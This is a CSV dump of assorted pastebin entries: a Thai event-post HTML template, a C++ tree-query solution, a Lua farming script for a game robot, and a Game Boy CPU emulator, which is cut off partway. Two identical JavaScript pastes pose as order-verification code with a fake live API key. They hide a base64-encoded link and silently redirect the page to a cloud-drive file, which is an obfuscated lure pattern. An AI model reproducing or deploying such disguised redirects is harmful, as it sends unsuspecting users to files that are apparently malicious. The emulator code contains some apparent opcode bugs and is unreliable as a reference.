id,title,username,language,date,content
CB8YSyev,Bloom & Dine - โพสต์,Kelly-B9978,HTML,Sunday 23rd of March 2025 01:04:45 PM CDT,"<link href=""https://dl.dropbox.com/scl/fi/tpnytrlcop69bxh49xizy/BloomnDine.css?rlkey=nofl9g8t20qld95ihxdlwh73m&st=hcommcgi"" rel=""stylesheet"">
<div id=""BloomnDine""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""bnd-thread"" class=""bnd-set"" style=""--bnd-bg: #f6eee3;--bnd-txt: #716d32;--bnd-primary: #545225;"">
<div class=""bnd-png1"" style=""--bnd-png: url(https://iili.io/3IR7uvj.png);transform: scaleX(-1) rotate(-45deg) translate(15%, 15%);""></div>
<div class=""bnd-png2"" style=""--bnd-png: url(https://iili.io/3IRBcB4.png);--bnd-pos: right top;--bnd-size: 80%;rotate: 20deg;""></div>
<div class=""bnd-paper"">
<div class=""bnd-name"">Bloom & Dine</div>
<div class=""bnd-gallery"">
<div class=""bnd-img"" style=""--bnd-pic: url(https://iili.io/3IANvt9.png);--bnd-pos: 50% 100%;--bnd-size: 105%;""></div>
<div class=""bnd-img"" style=""--bnd-pic: url(https://iili.io/3IAO0Ux.png);--bnd-pos: 50% 80%;""></div>
<div class=""bnd-img"" style=""--bnd-pic: url(https://iili.io/3IAOHSR.png);--bnd-pos: 50% 90%;--bnd-size: 110%;""></div>
<div class=""bnd-img"" style=""--bnd-pic: url(https://iili.io/3IAeCzP.png);--bnd-pos: 50% 68%;--bnd-size: 120%;""></div>
</div>
<div class=""bnd-content""> -- ข้อมูล อธิบายบรรยากาศในงาน --</div>
<div class=""bnd-topic"">เงื่อนไข</div>
[list]
[*]เงื่อนไข 1
[*]เงื่อนไข 2
[*]เงื่อนไข 3
[/list]
[align=center]( เขียนอะไรสักอย่าง )[/align]
</div></div></div>"
4QF97HWd,零食采购 参考代码,Dmaxiya,C++,Sunday 23rd of March 2025 12:41:19 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100000 + 100;
const int Log = 20;
int n, q, u, v, s, t, cnt;
int c[maxn], id[maxn];
int st[maxn][Log], bitMask[maxn][Log];
vector<int> G[maxn];

void dfs(int root, int fa) {
    id[root] = ++cnt;
    st[root][0] = fa;
    bitMask[root][0] = 1 << c[root];
    for (int i = 1; i < Log; ++i) {
        st[root][i] = st[st[root][i - 1]][i - 1];
        bitMask[root][i] = bitMask[root][i - 1] | bitMask[st[root][i - 1]][i - 1];
    }
    for (int pos : G[root]) {
        if (pos == fa) {
            continue;
        }
        dfs(pos, root);
    }
}

int solve(int s, int t) {
    if (s == t) {
        return 1;
    }
    if (id[s] > id[t]) {
        swap(s, t);
    }
    int mask = 0;
    for (int i = Log - 1; i >= 0; --i) {
        if (id[st[t][i]] > id[s]) {
            mask |= bitMask[t][i];
            t = st[t][i];
        }
    }
    mask |= bitMask[t][0];
    t = st[t][0];
    for (int i = Log - 1; i >= 0; --i) {
        if (id[st[s][i]] > id[t]) {
            mask |= bitMask[s][i];
            s = st[s][i];
        }
    }
    mask |= bitMask[s][0];
    return __builtin_popcount(mask | (1 << c[t]));
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif
    ios::sync_with_stdio(false);

    cin >> n >> q;
    for (int i = 1; i <= n; ++i) {
        cin >> c[i];
        --c[i];
    }
    for (int i = 1; i < n; ++i) {
        cin >> u >> v;
        G[u].push_back(v);
        G[v].push_back(u);
    }
    dfs(1, 1);
    while (q--) {
        cin >> s >> t;
        cout << solve(s, t) << endl;
    }

    return 0;
}
"
zR8WxxtV,farming.lua,PasteMrBin,Lua,Sunday 23rd of March 2025 12:20:16 PM CDT,"-- programma per farming

function farmingForward(numBlocksY)
    
    turtle.select(2)

    for i = 1, numBlocksY, 1 do
        turtle.digDown()
        turtle.placeDown()
        turtle.forward()
    end
end

function turnLeft()
    
    turtle.turnLeft()
    turtle.forward()
    turtle.turnLeft()
    turtle.forward()
end

function turnRight()

    turtle.turnRight()
    turtle.forward()
    turtle.turnRight()
    turtle.forward()
end

function backHome(numBlocksX, numBlocksY, pariDispari)

    if pariDispari % 2 ~= 0 then

        for i = 1, numBlocksY, 1 do
            turtle.forward()
        end

        turtle.turnLeft()

        for i = 1, numBlocksX, 1 do
            turtle.forward()
        end

    else
        turtle.turnRight()
        for i = 1, numBlocksX, 1 do
            turtle.forward()
        end
    end
end

function farming(numBlocksX, numBlocksY)
    turtle.up()
    turtle.forward()

    pariDispari = 0

    for i = 1, numBlocksX, 1 do
        farmingForward(numBlocksY)
        if i % 2 == 0 then
            turnRight()
        else
            turnLeft()
        end
        pariDispari = i
    end

    backHome(numBlocksX, numBlocksY, pariDispari)
end

farming(8, 8)
"
VtfW5yMy,Untitled,MiaMyLove,JavaScript,Sunday 23rd of March 2025 12:20:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/367/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mKYFkkUN,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 12:18:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/522/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Dc0hkFVt,SM83.h,kgkotzamanidis,C++,Sunday 23rd of March 2025 12:17:32 PM CDT,"/*
 *An Gameboy and GameboyColor emulation with project name GkotzamBoyGR
 *Copyright (C) <Fri Mar 21 2025>  <KGkotzamanidis>
 *
 *This program is free software: you can redistribute it and/or modify
 *it under the terms of the GNU General Public License as published by
 *the Free Software Foundation, either version 3 of the License, or
 *(at your option) any later version.
 *
 *This program is distributed in the hope that it will be useful,
 *but WITHOUT ANY WARRANTY; without even the implied warranty of
 *MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *GNU General Public License for more details.
 *
 *You should have received a copy of the GNU General Public License
 *along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
#include <cstdint>

#include ""EmulationUtils.h""
#include ""Motherboard.h""

class SM83
{
public:
    SM83(Motherboard &mem);

    void reset(void);
    void step(void);

    bool getDoubleSpeed();
    int getlastCycleCount();

private: /* CPU Functions */
    Motherboard *mem;

    int lastCycleCount;

    static const int instructionCount[];
    static const int prefixedinstructionCount[];

    void executeInstruction(uint8_t opcode);
    void executePrefixedInstruction(uint8_t opcode);

private: /* CPU Register functions */
    uint8_t A, B, C, D, E, F, H, L;
    uint16_t PC, SP;
    uint16_t AF();
    uint16_t BC();
    uint16_t DE();
    uint16_t HL();

    bool IME, IMEhold, ishalt, EIDIFlag, DoubleSpeed;

    void setAF(uint16_t data);
    void setBC(uint16_t data);
    void setDE(uint16_t data);
    void setHL(uint16_t data);

private: /* Flags */
    void setFlag(uint8_t flag, bool state);
    bool getFlag(uint8_t flag);

    bool getFlagZ();
    bool getFlagC();

private: /* Arithemtic and Logical Unit (ALU) */
    void alu16bitADD(uint16_t data);
    void alu16bitSPADD();

    void alu8bitADD(uint8_t data);
    void alu8bitADC(uint8_t data, bool carry);
    void alu8bitSUB(uint8_t data);
    void alu8bitSBC(uint8_t data, bool carry);

    uint8_t alu8bitINC(uint8_t data);
    uint8_t alu8bitDEC(uint8_t data);

    void logic8bitAND(uint8_t data);
    void logic8bitOR(uint8_t data);
    void logic8bitXOR(uint8_t data);
    void logic8bitCP(uint8_t data);
    void logic8bitDAA();
    void logic8bitCPL();

private: /* Rotate and Shift */
    uint8_t RLC(uint8_t data);
    uint8_t RL(uint8_t data);
    uint8_t RRC(uint8_t data);
    uint8_t RR(uint8_t data);
    uint8_t SLA(uint8_t data);
    uint8_t SRA(uint8_t data);
    uint8_t SRL(uint8_t data);
    uint8_t SWAP(uint8_t data);

    void BIT(int bit, uint8_t data);
    uint8_t SET(int bit, uint8_t data);
    uint8_t RES(int bit, uint8_t data);

private: /* CPU Control Instruction */
    void ccf(void);
    void scf(void);
    void nop(void);
    void halt(void);
    void stop(void);
    void di(void);
    void ei(void);

private: /* Jump Instruction */
    void jp(bool state);
    void jr(bool state);
    void call(bool state);
    void ret(bool state);
    void reti(void);
    void rst(uint8_t data);
};"
W0WdJ8dA,SM83.cpp,kgkotzamanidis,C++,Sunday 23rd of March 2025 12:16:21 PM CDT,"/*
 *An Gameboy and GameboyColor emulation with project name GkotzamBoyGR
 *Copyright (C) <Fri Mar 21 2025>  <KGkotzamanidis>
 *
 *This program is free software: you can redistribute it and/or modify
 *it under the terms of the GNU General Public License as published by
 *the Free Software Foundation, either version 3 of the License, or
 *(at your option) any later version.
 *
 *This program is distributed in the hope that it will be useful,
 *but WITHOUT ANY WARRANTY; without even the implied warranty of
 *MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *GNU General Public License for more details.
 *
 *You should have received a copy of the GNU General Public License
 *along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
#include ""SM83.h""
SM83::SM83(Motherboard &mem) : mem(&mem)
{
    std::printf(""Initiallize CPU Sector\n"");
    EIDIFlag = false;
    IME = false;
    IMEhold = false;
    ishalt = false;
}
const int SM83::instructionCount[] = {
	4,12,8,8,4,4,8,4,20,8,8,8,4,4,8,4,
	4,12,8,8,4,4,8,4,12,8,8,8,4,4,8,4,
	8,12,8,8,4,4,8,4,8,8,8,8,4,4,8,4,
	8,12,8,8,12,12,12,4,8,8,8,8,4,4,8,4,
	4,4,4,4,4,4,8,4,4,4,4,4,4,4,8,4,
	4,4,4,4,4,4,8,4,4,4,4,4,4,4,8,4,
	4,4,4,4,4,4,8,4,4,4,4,4,4,4,8,4,
	8,8,8,8,8,8,4,8,4,4,4,4,4,4,8,4,
	4,4,4,4,4,4,8,4,4,4,4,4,4,4,8,4,
	4,4,4,4,4,4,8,4,4,4,4,4,4,4,8,4,
	4,4,4,4,4,4,8,4,4,4,4,4,4,4,8,4,
	4,4,4,4,4,4,8,4,4,4,4,4,4,4,8,4,
	8,12,12,16,12,16,8,16,8,16,12,4,12,24,8,16,
	8,12,12,0,12,16,8,16,8,16,12,0,12,0,8,16,
	12,12,8,0,0,16,8,16,16,4,16,0,0,0,8,16,
	12,12,8,4,0,16,8,16,12,8,16,4,0,0,8,16,
};

const int SM83::prefixedinstructionCount[] = {
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,12,8,8,8,8,8,8,8,12,8,
	8,8,8,8,8,8,12,8,8,8,8,8,8,8,12,8,
	8,8,8,8,8,8,12,8,8,8,8,8,8,8,12,8,
	8,8,8,8,8,8,12,8,8,8,8,8,8,8,12,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
	8,8,8,8,8,8,16,8,8,8,8,8,8,8,16,8,
};

void SM83::reset(void)
{
    EIDIFlag = false;
    IME = false;
    IMEhold = false;
    ishalt = false;

    PC = 0x0000;
    SP = 0x0000;
    A = B = C = D = E = H = L = F = 0x00;
}

void SM83::step(void)
{
    IME = EIDIFlag ? IME : IMEhold;
    EIDIFlag = false;

    uint8_t iflags = mem->readByte(IFaddress);
    uint8_t ieflags = mem->readByte(IEaddress);
    uint8_t activeInterrupts = iflags & ieflags;

    if (activeInterrupts != 0)
    {
        ishalt = false;

        if (IME)
        {
            IMEhold = false;
            IME = false;

            if (activeInterrupts & VBlankInterrupt)
            {
                mem->writeByte(IFaddress, iflags & ~VBlankInterrupt);
                rst(0x40);
            }
            else if (activeInterrupts & LCDCInterrupt)
            {
                mem->writeByte(IFaddress, iflags & ~LCDCInterrupt);
                rst(0x48);
            }
            else if (activeInterrupts & timerOverflow)
            {
                mem->writeByte(IFaddress, iflags & ~timerOverflow);
                rst(0x50);
            }
            else if (activeInterrupts & buttonOverflow)
            {
                mem->writeByte(IFaddress, iflags & ~buttonOverflow);
                rst(0x60);
            }
        }
    }

    if (!ishalt)
    {
        executeInstruction(mem->readByte(PC));
    }
    else
    {
        lastCycleCount = 4;
    }
}

bool SM83::getDoubleSpeed()
{
    return DoubleSpeed;
}

int SM83::getlastCycleCount()
{
    return lastCycleCount;
}

/* For more information about the SM83 Instruction read this
   https://gbdev.io/gb-opcodes/optables/
*/
void SM83::executeInstruction(uint8_t opcode)
{
    PC++;
    lastCycleCount = instructionCount[opcode];

    switch (opcode)
    {
    case 0x00:
        nop();
        break;
    case 0x01:
        setBC(mem->readWord(PC));
        PC += 2;
        break;
    case 0x02:
        mem->writeByte(BC(), A);
        break;
    case 0x03:
        setBC(BC() + 1);
        break;
    case 0x04:
        B = alu8bitINC(B);
        break;
    case 0x05:
        B = alu8bitDEC(B);
        break;
    case 0x06:
        B = mem->readByte(PC);
        PC++;
        break;
    case 0x07:
    {
        /*
         *A = RLC(A);
         */
        bool carry = (A & 0x80) != 0;
        A = (A << 1) | (uint8_t)carry;
        setFlag(Flag_Z, false);
        setFlag(Flag_N, false);
        setFlag(Flag_H, false);
        setFlag(Flag_C, carry);
        break;
    }
    case 0x08:
        mem->writeWord(mem->readWord(PC), SP);
        PC += 2;
        break;
    case 0x09:
        alu16bitADD(BC());
        break;
    case 0x0A:
        A = mem->readByte(BC());
        break;
    case 0x0B:
        setBC(BC() - 1);
        break;
    case 0x0C:
        C = alu8bitINC(C);
        break;
    case 0x0D:
        C = alu8bitDEC(C);
        break;
    case 0x0E:
        C = mem->readByte(PC);
        PC++;
        break;
    case 0x0F:
    {
        /*
         *A = RRC(A);
         */
        bool carry = (A & 0x1) != 0;
        A = (A >> 1) | (carry << 7);
        setFlag(Flag_Z, false);
        setFlag(Flag_N, false);
        setFlag(Flag_H, false);
        setFlag(Flag_C, carry);
        break;
    }
    case 0x10:
        stop();
        PC++;
        break;
    case 0x11:
        setDE(mem->readWord(PC));
        PC += 2;
        break;
    case 0x12:
        mem->writeByte(DE(), A);
        break;
    case 0x13:
        setDE(DE() + 1);
        break;
    case 0x14:
        D = alu8bitINC(D);
        break;
    case 0x15:
        D = alu8bitDEC(D);
        break;
    case 0x16:
        D = mem->readByte(PC);
        PC++;
        break;
    case 0x17:
    {
        /*
         *A = RL(A);
         */
        bool carryFlagBit = getFlagC();
        bool carry = (A & 0x80) != 0;
        A = (A << 1) | (uint8_t)carryFlagBit;
        setFlag(Flag_Z, false);
        setFlag(Flag_N, false);
        setFlag(Flag_H, false);
        setFlag(Flag_C, carry);
        break;
    }
    case 0x18:
        jr(true);
        break;
    case 0x19:
        alu16bitADD(DE());
        break;
    case 0x1A:
        A = mem->readByte(DE());
        break;
    case 0x1B:
        setDE(DE() - 1);
        break;
    case 0x1C:
        E = alu8bitINC(E);
        break;
    case 0x1D:
        E = alu8bitDEC(E);
        break;
    case 0x1E:
        E = mem->readByte(PC);
        PC++;
        break;
    case 0x1F:
    {
        /*
         * A = RR(A);
         */
        bool carryFlagBit = getFlagC();
        bool carry = (A & 0x1) != 0;
        A = (A >> 1) | (carryFlagBit << 7);
        setFlag(Flag_Z, false);
        setFlag(Flag_N, false);
        setFlag(Flag_H, false);
        setFlag(Flag_C, carry);
        break;
    }
    case 0x20:
        jr(!getFlagZ());
        break;
    case 0x21:
        setHL(mem->readWord(PC));
        PC += 2;
        break;
    case 0x22:
        mem->writeByte(HL(), A);
        setHL(HL() + 1);
        break;
    case 0x23:
        setHL(HL() + 1);
        break;
    case 0x24:
        H = alu8bitINC(H);
        break;
    case 0x25:
        H = alu8bitDEC(H);
        break;
    case 0x26:
        H = mem->readByte(PC);
        PC++;
        break;
    case 0x27:
        logic8bitDAA();
        break;
    case 0x28:
        jr(getFlagZ());
        break;
    case 0x29:
        alu16bitADD(HL());
        break;
    case 0x2A:
        A = mem->readByte(HL());
        setHL(HL() + 1);
        break;
    case 0x2B:
        setHL(HL() - 1);
        break;
    case 0x2C:
        L = alu8bitINC(L);
        break;
    case 0x2D:
        L = alu8bitDEC(L);
        break;
    case 0x2E:
        L = mem->readByte(PC);
        PC++;
        break;
    case 0x2F:
        logic8bitCPL();
        break;
    case 0x30:
        jr(!getFlagC());
        break;
    case 0x31:
        SP = mem->readWord(PC);
        PC += 2;
        break;
    case 0x32:
        mem->writeByte(HL(), A);
        setHL(HL() - 1);
        break;
    case 0x33:
        SP++;
        break;
    case 0x34:
        mem->writeByte(HL(), alu8bitINC(mem->readByte(HL())));
        break;
    case 0x35:
        mem->writeByte(HL(), alu8bitDEC(mem->readByte(HL())));
        break;
    case 0x36:
        mem->writeWord(HL(), mem->readByte(PC));
        PC++;
        break;
    case 0x37:
        scf();
        break;
    case 0x38:
        jr(getFlagC());
        break;
    case 0x39:
        alu16bitADD(SP);
        break;
    case 0x3A:
        A = mem->readByte(HL());
        setHL(HL() - 1);
        break;
    case 0x3B:
        SP--;
        break;
    case 0x3C:
        A = alu8bitINC(A);
        break;
    case 0x3D:
        A = alu8bitDEC(A);
        break;
    case 0x3E:
        A = mem->readByte(PC);
        PC++;
        break;
    case 0x3F:
        ccf();
        break;
    case 0x40:
        B = B;
        break;
    case 0x41:
        B = C;
        break;
    case 0x42:
        B = D;
        break;
    case 0x43:
        B = E;
        break;
    case 0x44:
        B = H;
        break;
    case 0x45:
        B = L;
        break;
    case 0x46:
        B = mem->readByte(HL());
        break;
    case 0x47:
        B = A;
        break;
    case 0x48:
        C = B;
        break;
    case 0x49:
        C = C;
        break;
    case 0x4A:
        C = D;
        break;
    case 0x4B:
        C = E;
        break;
    case 0x4C:
        C = H;
        break;
    case 0x4D:
        C = L;
        break;
    case 0x4E:
        C = mem->readByte(HL());
        break;
    case 0x4F:
        C = A;
        break;
    case 0x50:
        D = B;
        break;
    case 0x51:
        D = C;
        break;
    case 0x52:
        D = D;
        break;
    case 0x53:
        D = E;
        break;
    case 0x54:
        D = H;
        break;
    case 0x55:
        D = L;
        break;
    case 0x56:
        D = mem->readByte(HL());
        break;
    case 0x57:
        D = A;
        break;
    case 0x58:
        E = B;
        break;
    case 0x59:
        E = C;
        break;
    case 0x5A:
        E = D;
        break;
    case 0x5B:
        E = E;
        break;
    case 0x5C:
        E = H;
        break;
    case 0x5D:
        E = L;
        break;
    case 0x5E:
        E = mem->readByte(HL());
        break;
    case 0x5F:
        E = A;
        break;
    case 0x60:
        H = B;
        break;
    case 0x61:
        H = C;
        break;
    case 0x62:
        H = D;
        break;
    case 0x63:
        H = E;
        break;
    case 0x64:
        H = H;
        break;
    case 0x65:
        H = L;
        break;
    case 0x66:
        H = mem->readByte(HL());
        break;
    case 0x67:
        H = A;
        break;
    case 0x68:
        L = B;
        break;
    case 0x69:
        L = C;
        break;
    case 0x6A:
        L = D;
        break;
    case 0x6B:
        L = E;
        break;
    case 0x6C:
        L = H;
        break;
    case 0x6D:
        L = L;
        break;
    case 0x6E:
        L = mem->readByte(HL());
        break;
    case 0x6F:
        L = A;
        break;
    case 0x70:
        mem->writeByte(HL(), B);
        break;
    case 0x71:
        mem->writeByte(HL(), C);
        break;
    case 0x72:
        mem->writeByte(HL(), D);
        break;
    case 0x73:
        mem->writeByte(HL(), E);
        break;
    case 0x74:
        mem->writeByte(HL(), H);
        break;
    case 0x75:
        mem->writeByte(HL(), L);
        break;
    case 0x76:
        halt();
        break;
    case 0x77:
        mem->writeByte(HL(), A);
        break;
    case 0x78:
        A = B;
        break;
    case 0x79:
        A = C;
        break;
    case 0x7A:
        A = D;
        break;
    case 0x7B:
        A = E;
        break;
    case 0x7C:
        A = H;
        break;
    case 0x7D:
        A = L;
        break;
    case 0x7E:
        A = mem->readByte(HL());
        break;
    case 0x7F:
        A = A;
        break;
    case 0x80:
        alu8bitADD(B);
        break;
    case 0x81:
        alu8bitADD(C);
        break;
    case 0x82:
        alu8bitADD(D);
        break;
    case 0x83:
        alu8bitADD(E);
        break;
    case 0x84:
        alu8bitADD(H);
        break;
    case 0x85:
        alu8bitADD(L);
        break;
    case 0x86:
        alu8bitADD(mem->readByte(HL()));
        break;
    case 0x87:
        alu8bitADD(A);
        break;
    case 0x88:
        alu8bitADC(B, getFlagC());
        break;
    case 0x89:
        alu8bitADC(C, getFlagC());
        break;
    case 0x8A:
        alu8bitADC(D, getFlagC());
        break;
    case 0x8B:
        alu8bitADC(E, getFlagC());
        break;
    case 0x8C:
        alu8bitADC(H, getFlagC());
        break;
    case 0x8D:
        alu8bitADC(L, getFlagC());
        break;
    case 0x8E:
        alu8bitADC(mem->readByte(HL()), getFlagC());
        break;
    case 0x8F:
        alu8bitADC(A, getFlagC());
        break;
    case 0x90:
        alu8bitSUB(B);
        break;
    case 0x91:
        alu8bitSUB(C);
        break;
    case 0x92:
        alu8bitSUB(D);
        break;
    case 0x93:
        alu8bitSUB(E);
        break;
    case 0x94:
        alu8bitSUB(H);
        break;
    case 0x95:
        alu8bitSUB(L);
        break;
    case 0x96:
        alu8bitSUB(mem->readByte(HL()));
        break;
    case 0x97:
        alu8bitSUB(A);
        break;
    case 0x98:
        alu8bitSBC(B, getFlagC());
        break;
    case 0x99:
        alu8bitSBC(C, getFlagC());
        break;
    case 0x9A:
        alu8bitSBC(D, getFlagC());
        break;
    case 0x9B:
        alu8bitSBC(E, getFlagC());
        break;
    case 0x9C:
        alu8bitSBC(H, getFlagC());
        break;
    case 0x9D:
        alu8bitSBC(L, getFlagC());
        break;
    case 0x9E:
        alu8bitSBC(mem->readByte(HL()), getFlagC());
        break;
    case 0x9F:
        alu8bitSBC(A, getFlagC());
        break;
    case 0xA0:
        logic8bitAND(B);
        break;
    case 0xA1:
        logic8bitAND(C);
        break;
    case 0xA2:
        logic8bitAND(D);
        break;
    case 0xA3:
        logic8bitAND(E);
        break;
    case 0xA4:
        logic8bitAND(H);
        break;
    case 0xA5:
        logic8bitAND(L);
        break;
    case 0xA6:
        logic8bitAND(mem->readByte(HL()));
        break;
    case 0xA7:
        logic8bitAND(A);
        break;
    case 0xA8:
        logic8bitXOR(B);
        break;
    case 0xA9:
        logic8bitXOR(C);
        break;
    case 0xAA:
        logic8bitXOR(D);
        break;
    case 0xAB:
        logic8bitXOR(E);
        break;
    case 0xAC:
        logic8bitXOR(H);
        break;
    case 0xAD:
        logic8bitXOR(L);
        break;
    case 0xAE:
        logic8bitXOR(mem->readByte(HL()));
        break;
    case 0xAF:
        logic8bitXOR(A);
        break;
    case 0xB0:
        logic8bitOR(B);
        break;
    case 0xB1:
        logic8bitOR(C);
        break;
    case 0xB2:
        logic8bitOR(D);
        break;
    case 0xB3:
        logic8bitOR(E);
        break;
    case 0xB4:
        logic8bitOR(H);
        break;
    case 0xB5:
        logic8bitOR(L);
        break;
    case 0xB6:
        logic8bitOR(mem->readByte(HL()));
        break;
    case 0xB7:
        logic8bitOR(A);
        break;
    case 0xB8:
        logic8bitCP(B);
        break;
    case 0xB9:
        logic8bitCP(C);
        break;
    case 0xBA:
        logic8bitCP(D);
        break;
    case 0xBB:
        logic8bitCP(E);
        break;
    case 0xBC:
        logic8bitCP(H);
        break;
    case 0xBD:
        logic8bitCP(L);
        break;
    case 0xBE:
        logic8bitCP(mem->readByte(HL()));
        break;
    case 0xBF:
        logic8bitCP(A);
        break;
    case 0xC0:
        ret(!getFlagZ());
        break;
    case 0xC1:
        setBC(mem->readWord(SP));
        SP += 2;
        break;
    case 0xC2:
        jp(!getFlagZ());
        break;
    case 0xC3:
        jp(true);
        break;
    case 0xC4:
        call(!getFlagZ());
        break;
    case 0xC5:
        SP -= 2;
        mem->writeWord(SP, BC());
        break;
    case 0xC6:
        alu8bitADD(mem->readByte(PC));
        PC++;
        break;
    case 0xC7:
        rst(0x00);
        break;
    case 0xC8:
        ret(getFlagZ());
        break;
    case 0xC9:
        ret(true);
        break;
    case 0xCA:
        jp(getFlagZ());
        break;
    case 0xCB:
        executePrefixedInstruction(mem->readByte(PC));
        break;
    case 0xCC:
        call(getFlagZ());
        break;
    case 0xCD:
        call(true);
        break;
    case 0xCE:
        alu8bitADC(mem->readByte(PC), getFlagC());
        PC++;
        break;
    case 0xCF:
        rst(0x08);
        break;
    case 0xD0:
        ret(!getFlagC());
        break;
    case 0xD1:
        setDE(mem->readWord(SP));
        SP += 2;
        break;
    case 0xD2:
        jp(!getFlagC());
        break;
    case 0xD3:
        /* Empty Instruction */
        std::cout << ""Empty Instruction"" << std::endl;
        break;
    case 0xD4:
        call(!getFlagC());
        break;
    case 0xD5:
        SP -= 2;
        mem->writeWord(SP, DE());
        break;
    case 0xD6:
        alu8bitSUB(mem->readByte(PC));
        PC++;
        break;
    case 0xD7:
        rst(0x10);
        break;
    case 0xD8:
        ret(getFlagC());
        break;
    case 0xD9:
        reti();
        break;
    case 0xDA:
        jp(getFlagC());
        break;
    case 0xDB:
        /* Empty Instruction */
        std::cout << ""Empty Instruction"" << std::endl;
        break;
    case 0xDC:
        call(getFlagC());
        break;
    case 0xDD:
        /* Empty Instruction */
        std::cout << ""Empty Instruction"" << std::endl;
        break;
    case 0xDE:
        alu8bitSBC(mem->readByte(PC), getFlagC());
        PC++;
        break;
    case 0xDF:
        rst(0x18);
        break;
    case 0xE0:
        mem->writeByte(0xFF00 + mem->readByte(PC), A);
        PC++;
        break;
    case 0xE1:
        setHL(mem->readWord(SP));
        SP += 2;
        break;
    case 0xE2:
        mem->writeByte(0xFF00 + C, A);
        break;
    case 0xE3:
        /* Empty Instruction */
        std::cout << ""Empty Instruction"" << std::endl;
        break;
    case 0xE4:
        /* Empty Instruction */
        std::cout << ""Empty Instruction"" << std::endl;
        break;
    case 0xE5:
        SP -= 2;
        mem->writeWord(SP, HL());
        break;
    case 0xE6:
        logic8bitAND(mem->readByte(PC));
        PC++;
        break;
    case 0xE7:
        rst(0x20);
        break;
    case 0xE8:
        alu16bitSPADD();
        break;
    case 0xE9:
        PC = HL();
        PC += 2;
        break;
    case 0xEA:
        mem->writeByte(mem->readWord(PC), A);
        PC += 2;
        break;
    case 0xEB:
        /* Empty Instruction */
        std::cout << ""Empty Instruction"" << std::endl;
        break;
    case 0xEC:
        /* Empty Instruction */
        std::cout << ""Empty Instruction"" << std::endl;
        break;
    case 0xED:
        /* Empty Instruction */
        std::cout << ""Empty Instruction"" << std::endl;
        break;
    case 0xEE:
        logic8bitXOR(mem->readByte(PC));
        PC++;
        break;
    case 0xEF:
        rst(0x28);
        break;
    case 0xF0:
        A = mem->readByte(0xFF00 + mem->readByte(PC));
        PC++;
        break;
    case 0xF1:
        setAF(mem->readWord(SP));
        SP += 2;
        break;
    case 0xF2:
        A = mem->readByte(0xFF00 + C);
        break;
    case 0xF3:
        di();
        break;
    case 0xF4:
        /* Empty Instruction */
        std::cout << ""Empty Instruction"" << std::endl;
    case 0xF5:
        SP -= 2;
        mem->writeWord(SP, AF());
        break;
    case 0xF6:
        logic8bitOR(mem->readByte(PC));
        PC++;
        break;
    case 0xF7:
        rst(0x30);
        break;
    case 0xF8:
    {
        int8_t data = mem->readByte(PC);
        uint16_t result = SP + data;
        setFlag(Flag_Z, false);
        setFlag(Flag_N, false);
        setFlag(Flag_H, ((SP & 0x0F) + (data & 0x0F)) > 0x0F);
        setFlag(Flag_C, result > 0xFFFF);
        setHL(result);
        PC++;
        break;
    }
    case 0xF9:
        SP = HL();
        break;
    case 0xFA:
        A = mem->readByte(mem->readWord(PC));
        PC += 2;
        break;
    case 0xFB:
        ei();
        break;
    case 0xFC:
        /* Empty Instruction */
        std::printf(""Empty Instruction"");
        break;
